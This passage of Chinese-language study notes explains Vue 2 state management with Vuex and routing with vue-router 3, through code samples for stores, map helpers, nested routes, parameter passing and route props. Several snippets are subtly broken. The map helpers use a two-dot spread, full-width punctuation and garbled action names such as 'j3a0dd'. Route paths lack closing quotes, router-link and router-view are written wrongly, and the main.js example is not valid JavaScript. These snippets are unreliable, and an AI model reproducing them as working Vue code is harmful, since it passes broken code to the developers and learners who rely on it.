      methods:{
        increament(){
           this.$store.commit('ADD',this.n);
        },
        decreament(){
          this.$store.commit('SUBSTRACT',this.n);
        },
        increamentOdd(){
            this.$store.dispatch('addOdd',this.n);
        },
        increamentWait(){
          this.$store.dispatch('addWait',this.n);
        },
      }
}
</script>
~~~

2 组件中读取Vuex中的数据 `：$store.state.sum` 
3.组件中修改vuex中的数据：`$store.dispatch('action中的方法名'，数据)或 $store.commit('mutatsons中的方法名'，数据)`

备注：

若没有网络请求或其他业务逻辑，组件中也可以越过 actions，即不写 dispatch , 直接编写 commit







## Vuex配置项 getters

index.js

~~~js
//该文件用于创建 vuex中最核心的store


import Vuex from 'vuex'

import Vue from 'vue'

Vue.use(Vuex);

//准备action 用于响应组件中的动作
const actions={
    //有逻辑在这里处理 mutations只负责 修改数据
    addOdd(context,value){
        if(context.state.sum % 2){
            context.commit('ADD',value);
        }
    },
    addWait(context,value){
       setTimeout(() => {
        context.commit('ADD',value);
       }, 500);
    }
}


//准备mutations 用于操作数据（state）
const mutations={
    ADD(state,value){
        state.sum+=value;
    },
    SUBSTRACT(state,value){
        state.sum-=value;
    }
}


//准备state 用于存储数据
const state ={
   sum:0
}


//准备getter 用于将state中的数据进行加工 然后保存 对各个组件可见
const getters={
    bigSum(state){
        return state.sum * 10;
    }
}

// 创建 并暴露 store
export default   new Vuex.Store({
    actions,
    mutations,
    state,
    getters
});

~~~



main.js

~~~js
/* 
 *  该文件是整个项目的入口文件
*/

// 相当于引入vue.runtime.mjs
import Vue from 'vue'
import App from './App.vue'


import store from './store' //默认找index.js

//关闭vue的生产提示
Vue.config.productionTip = false


//创建vue实例对象  vm
new Vue({
  //将App组件放入容器中
  render: h => h(App),
  store

}).$mount('#app')

~~~



App.vue

~~~vue
<template>
  <div class="container">
        <Count/>
  </div>
  </template>

  <script>
import Count from './components/Count.vue'
  export default {  
      name:'App',
      components:{Count},
}
  </script>
<style>
button{
  margin-left: 5px;
}
</style>
~~~



Count.vue

~~~~vue
<template>
<div>
  <h1>当前求和为：{{$store.state.sum}}</h1>
  <h1>放大十倍：{{$store.getters.bigSum}}</h1>

  <select v-model.number="n">
    <option :value="1">1</option>
    <option :value="2">2</option>
    <option :value="3">3</option>
  </select>

  <button @click="increament">+</button>
  <button @click="decreament">-</button>
  <button @click="increamentOdd">当前求和为奇数再加</button>
  <button @click="increamentWait">歇一下再加</button>
</div>
</template>

<script>

export default {
    name:'Count',
    data(){
        return{
          n:1,
          sum:0
        }
      },
      methods:{
        increament(){
           this.$store.commit('ADD',this.n);
        },
        decreament(){
          this.$store.commit('SUBSTRACT',this.n);
        },
        increamentOdd(){
            this.$store.dispatch('addOdd',this.n);
        },
        increamentWait(){
          this.$store.dispatch('addWait',this.n);
        },
      }
}
</script>
~~~~







## 四个map方法的使用

1.mapState方法：用于帮助我们映射 state 中的数据为计算属性

~~~js
computed：
{
//借助mapState生成计算属性，sum、school、subject（对象写法）
..mapState({sum:'sum'，school:'school'，subject:'subject'})
    
//借助mapState生成计算属性，sum、school、subject（数组写法）
...mapState(['sum','school','subject'])
},
~~~



2.mapGetters方法：用于帮助我们映射 getters 中的数据为计算属性

~~~js
computed：{
//借助mapGetters生成计算属性：bigSum（对象写法）
..mapGetters（{bigSum:'bigSum'}）,
    
//借助mapGetters生成计算属性，bigSum（数组写法）
...mapGetters（['bigSum'])
}
~~~





3.mapActions方法：用于帮助我们生成与 actions 对话的方法，即：包含$store.dispatch（x）的函数

~~~~js
methods:{
//靠mapActions生成，incrementOdd.incrementWait（对象形式）
...mapActions({incrementOdd：'jiaOdd'，incrementWait：'jiaWait'})
    
//靠mapActions生成：incrementOdd、incrementWait（数组形式）
...mapActions(['j3a0dd"，'3iaWait'])
}
~~~~



4.mapMutations方法：用于帮助找们生成与 mutations 对话的方法，即：包含 $store.commit（xxx）的函数

~~~js
methods:{
//靠mapActions生成：increment、decrement（对象形式）
...mapMutations({increment:'JIA'，decrement:'JIAN'})

//靠mapMutations生成：JIA、JIAN（对象形式）
...mapMutations(['JIA'，'JIAN']),
}
~~~



注意：

mapAcions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参教是事件对象









# 第6章:vue-router

## 1. 理解

1.vue-router 是 vue的一个插件库,专门用来实现SPA【单页面应用】

2.路由(route)就是 组key-value的对应关系

3.多个路由,需要经过路由器(router)的管理

4.key为路径, value 可能是function 或 component

---

![image-20221104214446123](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/202211042144377.png)

---





---

![image-20221104215105623](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/202211042151103.png)

----



## 2. 路由分类

1.后端路由:

1)理解: 键是uri路径，值是一个servlet 

2)工作过程:服务器接收到一个请求时,根据请求路径找到匹配servlet来处理请求,返回响应数据



2.前端路由:

1) 理解: 键是一个路径，值是组件,用于展示页面内容

2) 工作过程:当浏览器的路径改变时,对应的组件就会显示





## 3. 路由的作用：

1.完成 SPA (single page web application)应用 **单页面应用**

2.整个应用只有一个完整的页面

3.点击页面中的导航链接不会刷新页面,只会做页面的局部更新。

4.数据需要通过ajax请求获取。





## 4. 基本路由

使用的是脚手架2的话，对应的vueRouter版本为2

> npm i vue-router@3



在main.js中

~~~js
//引入路由器
import router from '../router/index.js'


//应用插件
Vue.use(VueRouter);


new Vue(
	el:'#root',
    render:h=>h(App);
	router//添加一个配置项
);
~~~



router/index.js

~~~~js
import VueRouter from 'vue-router'
//引入组件
import About from '../components/About'
import Home from '../components/Home'


//创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/about',
            component:About
        },
        {
            path:'/home',
            component:Home
        }
    ]
});
~~~~

>  看到：`/#/` 说明路由器已经在工作了



使用标签 `<router-link to:'/about' active-class='active'>`代替a标签 实现 路由跳转  (active-class可配置高亮样式)

使用` <router-vue></router-view>`指定路由组件呈现位置





## 5. 几个注意点

一般在文件夹`page`中 存放路由组件，在components文件夹中使用非路由组件

不同组件中会有一个属性 `$route` 对应着该组件的路由规则

不同组件中会有一个属性 `$router` 对应着 **全局的路由器** 	 

路由切换后, “隐藏” 了的路由组件,默认是被销毁掉的,需要的时候再去挂载



## 6. 嵌套路由（多级路由）

配置路由规则,使用children配置项:

router/index.js

~~~~js
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'

//创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/about',
            component:About
        },
        {
            path:'/home',
            component:Home,
            children:[
                //子路由的路径不需要 / 开头
                {
                    path:'news',
                    component:News
                },
                {
                    path:'message',
                    component:Message
                }
            ]
        }
    ]
});
~~~~

跳转(要写完整路径)

`<router-link to='/home/news'>News</router-link>`

## 7. 路由传参

### query传参 （显示参数）

**声明式**：

需要进行路由跳转的地方：

~~~vue
 <router-link :to="{name:'Child',query:{id:1}}">跳转到子路由</router-link>
~~~

路由书写方式：

~~~js
{
    path: '/child,
    name: 'Child',
    component: Child
   }
~~~





**编程式：**

需要进行路由跳转的地方：

~~~~js
  this.$router.push({
     name:'Child',
     query:{
      id:1
     }
  });
~~~~

路由书写方式：

~~~js
{
    path: '/child,
    name: 'Child',
    component: Child
   }
~~~



在路由组件中**接收:** `this.$route.query.id`



### params传参（不显示参数）

**声明式：**

需要路由跳转的地方：

~~~~vue
<router-link :to="{name:'Child',params:{id:1}}">跳转到子路由</router-link>
~~~~

路由书写方式：

~~~~js
{
    path: '/child,
    name: 'Child',
    component: Child
}
~~~~

在路由组件中**接收:** `this.$route.params.id`





**编程式：**

需要进行路由跳转的地方：

~~~js
this.$router.push({
     name:'Child',
     params:{
      id:1
     }
 });
~~~

路由书写方式：

~~~~js
{
    path: '/child,
    name: 'Child',
    component: Child
}
~~~~

在路由组件中**接收:** `this.$route.params.id`



### `params` 传参（显示参数）

**声明式：**

需要进行路由跳转的地方：

~~~vue
<router-link :to="/child/1"> 跳转到子路由 </router-link>
~~~



路由申明：

~~~js
{
    path: '/child/:id',
    component: Child
}
~~~

在组件中**接收:** `this.$route.params.id`







**编程式：**

需要进行路由跳转的地方：

~~~js
 this.$router.push({
     path:'/child/${id}',
  });
~~~



路由申明：

~~~js
{
    path: '/child/:id',
    component: Child
}
~~~

在组件中**接收:** `this.$route.params.id`



特别注意:路由携带params参数时,若使用to的 对象写法 ,则不能使用path配置项,必须使用name配置!







## 8. 命名路由

~~~html
<!--简化前-->
<router-link :to="{
                  path:'/home/message/detail'，
                  query:{
                  	  id:m.id,
                  	  title:m.title
                    }
                  }">
</router-link>

<!--简化后-->
<router-link :to="{
                  name:'xiangqing',
                      query:{
                          id:m.id,
                          title:m.title
                      }
                  }">
</router-link>
~~~

作用:可以简化路由的跳转(多级路由)



## 9. 路由的props配置（了解）

### props的第一种写法

值为对象，该对象中的所有key-value都会以props的形式传给Detail组件

router/index.js

~~~js
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'


//创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/about',
            component:About
        },
        {
            path:'/home',
            component:Home,
            children:[
                //子路由的路径不需要/
                {
                    path:'news',
                    component:News
                },
                {
                    path:'message',
                    component:Message,
                    children:[
                        {
                            path:'detail/:id/:title',
                            component:Detail,
                            props:{a:1,b:'hello'}
                        }
                    ]
                }
            ]
        }
    ]
});
~~~



Detail.vue

~~~vue
<template>
    <ul>
        <li>id：{{a}}</li>   
        <li>title：{{b}}</li>    
    </ul>
</template>



<script>
export default{
    name:'Detail',
    props:['a','b']
    
}
</script>
~~~

### props的第二种写法

值为布尔值,若布尔值为真,就会把该路由组件收到的所有  **params参数**  ,以props的形式传给Detail组件。



router/index.js

~~~js
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'


//创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/home',
            component:Home,
            children:[
                {
                    path:'message',
                    component:Message,
                    children:[
                        {
                            path:'detail/:id/:title',
                            component:Detail,
                            props:true
                        }
                    ]
                }
            ]
        }
    ]
});
~~~



Detail.vue

~~~vue
<template>
    <ul>
        <li>id：{{id}}</li>   
        <li>title：{{title}}</li>    
    </ul>
</template>



<script>
export default{
    name:'Detail',
    props:['id','title']
    
}
</script>
~~~

> 只能是params传参



### props的第三种写法

值为函数



router/index.js

~~~~js
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'


//创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/home',
            component:Home,
            children:[
                {
                    path:'message',
                    component:Message,
                    children:[
                        {
                            path:'detail/:id/:title',
                            component:Detail,
                            props($route){
                                return {id:$route.query.id,title:$route.query.title}
                            }
                            
                            <!--
                            解构1
                              props({query}){
                                return {id:query.id,title:query.title}
                            }
                
                
                  			解构2
                              props({query:{id,title}}){
                                return {id:id,title:title}
                            }
                            -->
                            
                           
                        }
                    ]
                }
            ]
        }
    ]
});
~~~~



Detail.vue

~~~vue
<template>
    <ul>
        <li>id：{{id}}</li>   
        <li>title：{{title}}</li>    
    </ul>
</template>



<script>
export default{
    name:'Detail',
    props:['id','title']
    
}
</script>
~~~



props作用:让路由组件更方便的收到参数







 ## 10. `<router-link> `的replace属性

作用:控制路由跳转时操作浏览器历史记录的模式

浏览器的历史记录有两种写入方式:分别为push和replace,

​	push是追加历史记录

​	replace是替换当前记录

​	路由跳转时候默认为push

如何开启replace模式: `<router-link replace>News</router-link>`



相关 API： 

1. `this.$router.push(path)`: 相当于点击路由链接(可以返回到当前路由界面) 
2.  `this.$router.replace(path)`: 用新路由替换当前路由(不可以返回到当前路由界面) 
3.  `this.$router.back()`: 请求(返回)上一个记录路由 
4.  `this.$router.go(-1)`: 请求(返回)上一个记录路由 
5. `this.$router.go(1)`: 请求下一个记录路由





# 第 7 章：Vue UI 组件库

## 7.1 移动端常用 UI 组件库 

1. Vant https://youzan.github.io/vant 
2. Cube UI https://didi.github.io/cube-ui 
3. Mint UI http://mint-ui.github.io 



## 7.2 PC 端常用 UI 组件库 

1. Element UI https://element.eleme.cn 
2.  IView UI https://www.iviewui.co
